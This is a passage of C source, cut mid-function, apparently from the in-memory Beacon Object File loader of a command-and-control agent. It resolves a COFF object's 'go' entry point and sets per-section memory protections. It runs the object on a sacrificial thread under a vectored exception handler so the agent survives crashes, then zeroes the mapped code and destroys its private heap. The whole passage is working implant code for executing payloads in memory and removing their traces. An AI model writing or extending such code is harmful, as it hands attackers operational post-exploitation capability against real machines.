        if (g_tls_ctx != TLS_OUT_OF_INDEXES) TlsSetValue(g_tls_ctx, NULL);
        return -3;
    }

    // ── Find entry point ("go") ────────────────────────────────────────
    void (*entry)(const char *, int) = NULL;
    for (uint32_t s = 0; s < hdr->NumberOfSymbols; s++) {
        const COFF_SYMBOL *sym =
            (const COFF_SYMBOL *)(sym_table + s * sizeof(COFF_SYMBOL));
        if (sym->StorageClass != 2) continue;
        const char *name;
        char nb[256];
        if (sym->N.ShortName[0]) {
            memcpy(nb, sym->N.ShortName, 8); nb[8]='\0'; name=nb;
        } else {
            name = str_table + sym->N.LongName.Offset;
        }
        if (!strcmp(name, "go")) {
            entry = (void(*)(const char*,int))(
                mem + sections[sym->SectionNumber-1].VirtualAddress + sym->Value);
            break;
        }
    }
    if (!entry) {
        ctx_release_dlls(&ctx);
        memset(mem, 0, total);
        VirtualFree(mem, 0, MEM_RELEASE);
        if (ctx.bof_heap) { HeapDestroy(ctx.bof_heap); ctx.bof_heap = NULL; }
        if (g_tls_ctx != TLS_OUT_OF_INDEXES) TlsSetValue(g_tls_ctx, NULL);
        return -1;
    }

    // ── Phase 2: Flip memory permissions (I3 + I6) ────────────────────
    // Per-section protection: executable sections → RX, rest → RO.
    // No single blanket VirtualProtect on the whole mapping.
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (!sections[i].SizeOfRawData) continue;
        DWORD prot = (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
                     ? PAGE_EXECUTE_READ   // .text
                     : PAGE_READONLY;      // .data / .rdata / .bss
        DWORD old;
        VirtualProtect(
            mem + sections[i].VirtualAddress,
            sections[i].SizeOfRawData,
            prot, &old);
    }

    // ── Execute on sacrificial thread under scoped VEH (v6 pattern) ───
    ctx.bof_base = mem;
    ctx.bof_span = total;

    void *veh = AddVectoredExceptionHandler(1, bof_veh);

    BOF_THREAD_CTX tc;
    memset(&tc, 0, sizeof(tc));
    tc.entry    = entry;
    tc.args     = (const char *)args_data;
    tc.args_len = (int)args_size;
    tc.ctx      = &ctx;

    HANDLE th = CreateThread(NULL, 0, bof_thread_trampoline, &tc, 0, NULL);
    if (!th) {
        if (veh) RemoveVectoredExceptionHandler(veh);
        ctx.bof_base = NULL; ctx.bof_span = 0;
        ctx_release_dlls(&ctx);
        memset(mem, 0, total);
        VirtualFree(mem, 0, MEM_RELEASE);
        if (ctx.bof_heap) { HeapDestroy(ctx.bof_heap); ctx.bof_heap = NULL; }
        if (g_tls_ctx != TLS_OUT_OF_INDEXES) TlsSetValue(g_tls_ctx, NULL);
        return -5;
    }

    DWORD wait_rc = WaitForSingleObject(th, BOF_RUN_TIMEOUT_MS);
    if (wait_rc == WAIT_TIMEOUT) {
        // Runaway BOF — kill only the sacrificial thread.
        // I5: explicitly reset output state so next call starts clean.
        TerminateThread(th, 1);
        WaitForSingleObject(th, 1000);
        ctx.out_pos = 0;
        if (ctx.out_buf && ctx.out_size > 0) ctx.out_buf[0] = '\0';
    }
    CloseHandle(th);

    if (veh) RemoveVectoredExceptionHandler(veh);
    ctx.bof_base = NULL;
    ctx.bof_span = 0;

    // ── Determine return code ──────────────────────────────────────────
    int rc;
    if (wait_rc == WAIT_TIMEOUT) {
        if (ctx.out_buf && ctx.out_size > 0)
            snprintf(ctx.out_buf, ctx.out_size,
                "[BOF] timed out (>2 min) — sacrificial thread terminated, agent survived\n");
        rc = -6;
    } else if (InterlockedCompareExchange(&ctx.crashed, 0, 0) != 0) {
        rc = -4;
    } else if (tc.done) {
        rc = ctx.out_pos;
    } else {
        rc = -5;
    }

    // ── Cleanup (I7: FreeLibrary before wipe) ─────────────────────────
    ctx_release_dlls(&ctx);           // unload DLLs we pulled in (I7)
    memset(mem, 0, total);            // wipe code+data
    VirtualFree(mem, 0, MEM_RELEASE); // release mapping

    // v8: Destroy the PRIVATE HEAP. This wipes ALL BOF allocations,
    // including any that the BOF leaked (forgot to HeapFree). Any heap
    // corruption that occurred during BOF execution is contained to
    // this heap and is destroyed here — the agent's process heap is
    // completely unaffected.
    if (ctx.bof_heap) {
        HeapDestroy(ctx.bof_heap);
        ctx.bof_heap = NULL;
    }

    // Clear TLS slot on calling thread
    if (g_tls_ctx != TLS_OUT_OF_INDEXES)
        TlsSetValue(g_tls_ctx, NULL);

    return rc;
}
